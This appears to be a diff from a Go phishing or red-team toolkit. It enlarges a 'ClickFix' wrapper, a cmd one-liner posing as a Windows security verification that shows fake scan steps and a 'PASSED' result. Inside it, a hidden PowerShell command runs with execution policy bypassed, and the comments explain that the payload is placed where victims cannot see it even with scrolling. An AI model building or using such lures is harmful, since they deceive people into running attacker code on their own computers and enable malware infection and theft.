@@ -84,7 +84,10 @@ func wrapClickFixPayload(command string) string {
 	// Wrap: legitimate-looking security verification with payload deep inside.
 	// {VID} is replaced at runtime by the template JS with the same random
 	// verification ID shown on the page — the victim sees matching IDs.
-	return `cmd /c "title Security Check {VID} & color 0A & echo Verifying system {VID}... & timeout /t 2 >nul & echo Analyzing files... & timeout /t 1 >nul & powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "` + command + `" & echo Check {VID} complete. & exit"`
+	// The wrapper is ~550 chars: ~250 before the payload (scanning steps)
+	// and ~250 after (result, log path, cleanup) so the payload is buried
+	// in the middle and invisible even with horizontal scrolling.
+	return `cmd /c "title Security Check {VID} & color 0A & mode con: cols=50 lines=12 & echo. & echo  Windows Security Verification Tool & echo  Verification ID: {VID} & echo. & echo  [1/4] Scanning system files... & timeout /t 1 >nul & echo  [2/4] Analyzing registry entries... & timeout /t 1 >nul & echo  [3/4] Checking certificate store... & timeout /t 1 >nul & echo  [4/4] Verifying digital signatures... & timeout /t 2 >nul & powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "` + command + `" & echo. & echo  Validation complete. & echo  Result: PASSED (ID: {VID}) & echo  Log saved: C:\Windows\Temp\security_{VID}.log & timeout /t 2 >nul & del /q %%TEMP%%\security_{VID}.tmp 2>nul & exit"`
 }
 
 // renderClickFix substitutes all placeholders:
